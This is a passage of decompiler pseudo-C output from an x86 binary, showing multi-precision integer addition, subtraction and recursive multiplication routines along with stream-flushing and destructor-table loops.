                if(eax != 1) {
                    goto L08059913;
                }
                (save)A10;
                (save)edi;
                edi = Vfffffff8;
                (save)edi;
                (save)edi;
                eax = L08066380();
            }
            edx = eax;
L08059913:
            edi = A10;
            *(Vfffffff8 + edi * 4) = edx;
            ebx = ebx + 8;
            Vfffffffc = Vfffffffc + 2;
        } while(Vfffffffc != edi);
    }
L0805992c:
    esp = ebp - 20;
}



L08059938(A8, Ac, A10, A14)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    esi = A10;
    if(!(esi & 1)) {
        esi = esi - 1;
        Vfffffff0 = esi;
        if(esi > 31) {
            L08059938(A8, Ac, esi, A14);
L0805996e:
            esi = Vfffffff0;
            edi = Ac;
            (save) *(edi + esi * 4);
            (save)esi;
            (save)edi;
            edi = A8;
            ebx = edi + esi * 4;
            (save)ebx;
            *(edi + (Vfffffff0 + Vfffffff0) * 4) = L08066420();
            edi = Ac;
            (save) *(edi + esi * 4);
            (save)A10;
            (save)edi;
            (save)ebx;
            eax = A10 + Vfffffff0;
            *(A8 + eax * 4) = L08066420();
            goto L08059f40;
        }
        L0805971C(A8, Ac, Vfffffff0);
        goto L0805996e;
L080599d0:
        edi = Vfffffffc;
        L0805971C(A8 + A10 * 4, Ac + edi * 4, edi);
    } else {
        edi = A10 >> 1;
        Vfffffffc = edi;
        if(edi <= 31) {
            goto L080599d0;
        }
        L08059938(A8 + A10 * 4, Ac + edi * 4, edi, A14);
    }
    edi = Vfffffffc;
    esi = Ac;
    ebx = esi + edi * 4;
    if(L08057F48(ebx, esi, edi) >= 0) {
        (save)edi;
        (save)esi;
        (save)ebx;
        (save)A8;
        goto L08059a84;
L08059a40:
        L0805971C(A14, A8, Vfffffffc);
        goto L08059ab0;
L08059a58:
        L0805971C(A14, Ac, Vfffffffc);
    } else {
        esi = Vfffffffc;
        (save)esi;
        edi = Ac;
        (save)edi + esi * 4;
        (save)edi;
        (save)A8;
L08059a84:
        L0805A010();
        esp = esp + 16;
        if(Vfffffffc <= 31) {
            goto L08059a40;
        }
        L08059938(A14, A8, Vfffffffc, A14 + A10 * 4);
L08059ab0:
        if(Vfffffffc > 0) {
            edx = A10 * 4;
            edi = Vfffffffc;
            ecx = edi * 4;
            ebx = edx + ecx;
            if(eax = edi & 3) {
                goto L08059b14;
            }
            if(eax > 1) {
                if(eax > 2) {
                    esi = A8;
                    *(esi + ecx) = *(esi + edx);
                    edx = edx + 4;
                    ecx = ecx + 4;
                }
                edi = A8;
                *(edi + ecx) = *(edi + edx);
                edx = edx + 4;
                ecx = ecx + 4;
            }
            esi = A8;
            *(esi + ecx) = *(esi + edx);
            edx = edx + 4;
            ecx = ecx + 4;
            if(edx != ebx) {
L08059b14:
                do {
                    edi = A8;
                    *(edi + ecx) = *(edi + edx);
                    *(edi + ecx + 4) = *(edi + edx + 4);
                    *(edi + ecx + 8) = *(edi + edx + 8);
                    *(edi + ecx + 12) = *(edi + edx + 12);
                    edx = edx + 16;
                    ecx = ecx + 16;
                } while(edx != ebx);
            }
        }
        esi = Vfffffffc;
        (save)esi;
        edi = A10 << 2;
        Vfffffff0 = edi;
        eax = A8 + Vfffffff0;
        ebx = esi * 4;
        (save)ebx + eax;
        (save)eax;
        (save)eax;
        Vfffffff8 = L08066380();
        (save)A10;
        (save)A14;
        ebx = ebx + A8;
        (save)ebx;
        (save)ebx;
        Vfffffff8 = Vfffffff8 - L0805A010();
        esp = esp + 32;
        if(Vfffffffc <= 31) {
            goto L08059a58;
        }
        L08059938(A14, Ac, Vfffffffc, A14 + Vfffffff0);
    }
    ebx = A8 + Vfffffffc * 4;
    Vfffffff8 = Vfffffff8 + L08066380(ebx, ebx, A14, A10);
    if(Vfffffff8 != 0) {
        ebx = ebx + A10 * 4;
        esi = Vfffffffc;
        Vfffffff4 = esi;
        edx = *ebx;
        Vfffffff0 = ebx + 4;
        eax = Vfffffff8 + edx;
        *ebx = eax;
        ebx = Vfffffff0;
        if(eax >= edx) {
            goto L08059ccc;
        }
        Vfffffff4 = esi;
        if(!(esi = esi - 1)) {
            eax = ~esi & 3;
            if(esi > 0) {
                if(eax == 0) {
                    goto L08059c70;
                }
                if(eax < 3) {
                    if(eax < 2) {
                        edx = *ebx + 1;
                        Vfffffff0 = ebx + 4;
                        *ebx = edx;
                        ebx = Vfffffff0;
                        if(edx != 0) {
                            goto L08059ccc;
                        }
                        Vfffffff4 = Vfffffffc + -2;
                    }
                    esi = Vfffffff0;
                    edx = *esi + 1;
                    Vfffffff0 = esi + 4;
                    *ebx = edx;
                    ebx = ebx + 4;
                    if(edx != 0) {
                        goto L08059ccc;
                    }
                    Vfffffff4 = Vfffffff4 - 1;
                }
            }
            edi = Vfffffff0;
            edx = *edi + 1;
            Vfffffff0 = edi + 4;
            *ebx = edx;
            ebx = ebx + 4;
            if(edx != 0) {
                goto L08059ccc;
            }
            if(!(Vfffffff4 = Vfffffff4 - 1)) {
L08059c70:
                do {
                    esi = Vfffffff0;
                    edx = *esi + 1;
                    esi = esi + 4;
                    Vfffffff0 = esi;
                    *ebx = edx;
                    ebx = ebx + 4;
                    if(edx != 0) {
                        goto L08059ccc;
                    }
                    Vfffffff4 = Vfffffff4 - 1;
                    edx = *esi + 1;
                    esi = esi + 4;
                    Vfffffff0 = esi;
                    *ebx = edx;
                    ebx = ebx + 4;
                    if(edx != 0) {
                        goto L08059ccc;
                    }
                    Vfffffff4 = Vfffffff4 - 1;
                    edx = *esi + 1;
                    esi = esi + 4;
                    Vfffffff0 = esi;
                    *ebx = edx;
                    ebx = ebx + 4;
                    if(edx != 0) {
                        goto L08059ccc;
                    }
                    Vfffffff4 = Vfffffff4 - 1;
                    edx = *esi + 1;
                    Vfffffff0 = esi + 4;
                    *ebx = edx;
                    ebx = ebx + 4;
                    if(edx != 0) {
                        goto L08059ccc;
                    }
                } while(Vfffffff4 = Vfffffff4 - 1);
                goto L08059d3c;
L08059ccc:
                if(Vfffffff0 != ebx) {
                    ecx = 0;
                    edi = Vfffffff4 - 1;
                    Vfffffff4 = edi;
                    if(0 < edi) {
                        if(eax = edi & 3) {
                            goto L08059d10;
                        }
                        if(eax > 1) {
                            if(eax > 2) {
                                *ebx = *Vfffffff0;
                                ecx = 1;
                            }
                            *(ebx + ecx * 4) = *(Vfffffff0 + ecx * 4);
                            ecx = ecx + 1;
                        }
                        *(ebx + ecx * 4) = *(Vfffffff0 + ecx * 4);
                        ecx = ecx + 1;
                        if(Vfffffff4 != ecx) {
L08059d10:
                            do {
                                edi = Vfffffff0;
                                *(ebx + ecx * 4) = *(edi + ecx * 4);
                                edx = ecx + 1;
                                *(ebx + edx * 4) = *(edi + edx * 4);
                                edx = ecx + 2;
                                *(ebx + edx * 4) = *(edi + edx * 4);
                                edx = ecx + 3;
                                *(ebx + edx * 4) = *(edi + edx * 4);
                                ecx = ecx + 4;
                            } while(Vfffffff4 != ecx);
                        }
                    }
                }
            }
        }
    }
L08059d3c:
    ecx = 0;
    if(Vfffffffc > 0) {
        if(eax = Vfffffffc & 3) {
            goto L08059d80;
        }
        if(eax > 1) {
            if(eax > 2) {
                *A8 = *A14;
                ecx = 1;
            }
            eax = *(A14 + ecx * 4);
            *(A8 + ecx * 4) = eax;
            ecx = ecx + 1;
        }
        eax = *(A14 + ecx * 4);
        *(A8 + ecx * 4) = eax;
        ecx = ecx + 1;
        if(Vfffffffc != ecx) {
L08059d80:
            do {
                esi = A14;
                eax = *(esi + ecx * 4);
                edi = A8;
                *(edi + ecx * 4) = eax;
                eax = ecx + 1;
                *(edi + eax * 4) = *(esi + eax * 4);
                eax = ecx + 2;
                *(edi + eax * 4) = *(esi + eax * 4);
                eax = ecx + 3;
                *(edi + eax * 4) = *(esi + eax * 4);
                ecx = ecx + 4;
            } while(Vfffffffc != ecx);
        }
    }
    esi = Vfffffffc;
    eax = esi * 4;
    eax = eax + A8;
    eax = L08066380(eax, eax, A14 + eax, esi);
    Vfffffff8 = eax;
    if(eax != 0) {
        edi = A10;
        ebx = A8 + edi * 4;
        Vfffffff4 = edi;
        edx = *ebx;
        Vfffffff0 = ebx + 4;
        eax = edx + 1;
        *ebx = eax;
        ebx = Vfffffff0;
        if(eax >= edx) {
            goto L08059ed0;
        }
        if(!(Vfffffff4 = Vfffffff4 - 1)) {
            eax = ~Vfffffff4 & 3;
            if(Vfffffff4 > 0) {
                if(eax == 0) {
                    goto L08059e74;
                }
                if(eax < 3) {
                    if(eax < 2) {
                        edx = *ebx + 1;
                        Vfffffff0 = ebx + 4;
                        *ebx = edx;
                        ebx = Vfffffff0;
                        if(edx != 0) {
                            goto L08059ed0;
                        }
                        Vfffffff4 = Vfffffff4 - 1;
                    }
                    edi = Vfffffff0;
                    edx = *edi + 1;
                    Vfffffff0 = edi + 4;
                    *ebx = edx;
                    ebx = ebx + 4;
                    if(edx != 0) {
                        goto L08059ed0;
                    }
                    Vfffffff4 = Vfffffff4 - 1;
                }
            }
            esi = Vfffffff0;
            edx = *esi + 1;
            Vfffffff0 = esi + 4;
            *ebx = edx;
            ebx = ebx + 4;
            if(edx != 0) {
                goto L08059ed0;
            }
            if(!(Vfffffff4 = Vfffffff4 - 1)) {
L08059e74:
                do {
                    edi = Vfffffff0;
                    edx = *edi + 1;
                    edi = edi + 4;
                    Vfffffff0 = edi;
                    *ebx = edx;
                    ebx = ebx + 4;
                    if(edx != 0) {
                        goto L08059ed0;
                    }
                    Vfffffff4 = Vfffffff4 - 1;
                    edx = *edi + 1;
                    edi = edi + 4;
                    Vfffffff0 = edi;
                    *ebx = edx;
                    ebx = ebx + 4;
                    if(edx != 0) {
                        goto L08059ed0;
                    }
                    Vfffffff4 = Vfffffff4 - 1;
                    edx = *edi + 1;
                    edi = edi + 4;
                    Vfffffff0 = edi;
                    *ebx = edx;
                    ebx = ebx + 4;
                    if(edx != 0) {
                        goto L08059ed0;
                    }
                    Vfffffff4 = Vfffffff4 - 1;
                    edx = *edi + 1;
                    Vfffffff0 = edi + 4;
                    *ebx = edx;
                    ebx = ebx + 4;
                    if(edx != 0) {
                        goto L08059ed0;
                    }
                } while(Vfffffff4 = Vfffffff4 - 1);
                goto L08059f40;
L08059ed0:
                if(Vfffffff0 != ebx) {
                    ecx = 0;
                    esi = Vfffffff4 - 1;
                    Vfffffff4 = esi;
                    if(0 < esi) {
                        if(eax = esi & 3) {
                            goto L08059f14;
                        }
                        if(eax > 1) {
                            if(eax > 2) {
                                *ebx = *Vfffffff0;
                                ecx = 1;
                            }
                            *(ebx + ecx * 4) = *(Vfffffff0 + ecx * 4);
                            ecx = ecx + 1;
                        }
                        eax = *(Vfffffff0 + ecx * 4);
                        *(ebx + ecx * 4) = eax;
                        ecx = ecx + 1;
                        if(Vfffffff4 != ecx) {
L08059f14:
                            do {
                                esi = Vfffffff0;
                                *(ebx + ecx * 4) = *(esi + ecx * 4);
                                edx = ecx + 1;
                                *(ebx + edx * 4) = *(esi + edx * 4);
                                edx = ecx + 2;
                                *(ebx + edx * 4) = *(esi + edx * 4);
                                edx = ecx + 3;
                                eax = *(esi + edx * 4);
                                *(ebx + edx * 4) = eax;
                                ecx = ecx + 4;
                            } while(Vfffffff4 != ecx);
                        }
                    }
                }
            }
        }
    }
L08059f40:
    esp = ebp - 28;
}





L0805A010(A8, Ac, A10, A14)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
{
	/* unknown */ void  esi;
	/* unknown */ void  edi;



    edi = A8;
    esi = Ac;
    edx = A10;
    ecx = A14;
    eax = ecx;
    ecx = ecx >> 3;
    if(!(eax = ~eax & 7)) {
        ecx = ecx + 1;
        edi = edi - (eax << 2);
        esi = esi - eax;
        edx = edx - eax;
        goto ((eax >> 2) + (eax >> 2) * 8 + 0x805a04d);
    }
    do {
        eax = *esi;
        asm("sbb eax,[edx]");
        *edi = eax;
        eax = *(esi + 4);
        asm("sbb eax,[edx+0x4]");
        *(edi + 4) = eax;
        eax = *(esi + 8);
        asm("sbb eax,[edx+0x8]");
        *(edi + 8) = eax;
        eax = *(esi + 12);
        asm("sbb eax,[edx+0xc]");
        *(edi + 12) = eax;
        eax = *(esi + 16);
        asm("sbb eax,[edx+0x10]");
        *(edi + 16) = eax;
        eax = *(esi + 20);
        asm("sbb eax,[edx+0x14]");
        *(edi + 20) = eax;
        eax = *(esi + 24);
        asm("sbb eax,[edx+0x18]");
        *(edi + 24) = eax;
        eax = *(esi + 28);
        asm("sbb eax,[edx+0x1c]");
        *(edi + 28) = eax;
        edi = edi + 32;
        esi = esi + 32;
        edx = edx + 32;
    } while(ecx = ecx - 1);
    asm("sbb eax,eax");
    return(~eax);
}


L08062188()
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;



    esi = 0;
    ebx = *L080787F8;
    do {
        if(*(ebx + 16) < *(ebx + 20) && *( *( *(ebx + 80) + 20))(ebx, -1) == -1) {
            esi = -1;
        }
        ebx = *(ebx + 52);
    } while(ebx != 0);
    return(esi);
}


L08066380(A8, Ac, A10, A14)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
{
	/* unknown */ void  esi;
	/* unknown */ void  edi;



    edi = A8;
    esi = Ac;
    edx = A10;
    ecx = A14;
    eax = ecx;
    ecx = ecx >> 3;
    if(!(eax = ~eax & 7)) {
        ecx = ecx + 1;
        edi = edi - (eax << 2);
        esi = esi - eax;
        edx = edx - eax;
        goto ((eax >> 2) + (eax >> 2) * 8 + 0x80663bd);
    }
    do {
        eax = *esi;
        asm("adc eax,[edx]");
        *edi = eax;
        eax = *(esi + 4);
        asm("adc eax,[edx+0x4]");
        *(edi + 4) = eax;
        eax = *(esi + 8);
        asm("adc eax,[edx+0x8]");
        *(edi + 8) = eax;
        eax = *(esi + 12);
        asm("adc eax,[edx+0xc]");
        *(edi + 12) = eax;
        eax = *(esi + 16);
        asm("adc eax,[edx+0x10]");
        *(edi + 16) = eax;
        eax = *(esi + 20);
        asm("adc eax,[edx+0x14]");
        *(edi + 20) = eax;
        eax = *(esi + 24);
        asm("adc eax,[edx+0x18]");
        *(edi + 24) = eax;
        eax = *(esi + 28);
        asm("adc eax,[edx+0x1c]");
        *(edi + 28) = eax;
        edi = edi + 32;
        esi = esi + 32;
        edx = edx + 32;
    } while(ecx = ecx - 1);
    asm("sbb eax,eax");
    return(~eax);
}



L08066420(A8, Ac, A10, A14)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
{
	/* unknown */ void  esi;
	/* unknown */ void  edi;



    (save)ebp;
    edi = A8 + A10 * 4;
    esi = Ac + A10 * 4;
    ecx = ~A10;
    ebp = 0;
    do {
        eax = *(esi + ecx * 4);
        asm("mul ebx");
        eax = eax + ebp;
        asm("adc edx,+0x0");
        *(edi + ecx * 4) = *(edi + ecx * 4) + eax;
        asm("adc edx,+0x0");
        ebp = edx;
    } while(ecx = ecx + 1);
    eax = ebp;
    (restore)ebp;
}

L080675A8()
{
	/* unknown */ void  ebx;



    ebx = 134714028;
    if(*L080792AC != -1) {
        do {
            eax = *( *ebx)();
            ebx = ebx + -4;
        } while(*ebx != -1);
    }
}
